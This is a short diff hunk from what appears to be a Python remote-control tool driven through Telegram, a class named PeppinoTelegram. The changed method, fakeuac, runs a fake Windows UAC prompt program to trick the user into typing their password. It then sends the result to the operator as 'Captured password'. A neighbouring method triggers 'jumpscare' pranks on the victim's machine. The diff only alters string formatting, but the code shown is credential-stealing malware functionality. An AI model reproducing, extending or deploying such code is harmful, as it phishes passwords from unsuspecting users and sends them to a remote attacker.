@@ -1087,7 +1087,7 @@ class PeppinoTelegram:
     def fakeuac(self) -> None:
         proc = sp.run(fake_uac_prompt_path, stdout=sp.PIPE, stderr=sp.PIPE)
         output = proc.stdout
-        self.bsend(f"Captured password: {str(output)}")
+        self.bsend(f"Captured password: {output}")
 
     def gabinetti(self) -> None:
         self.jumpscare("plankton_meme", "gabinetti")
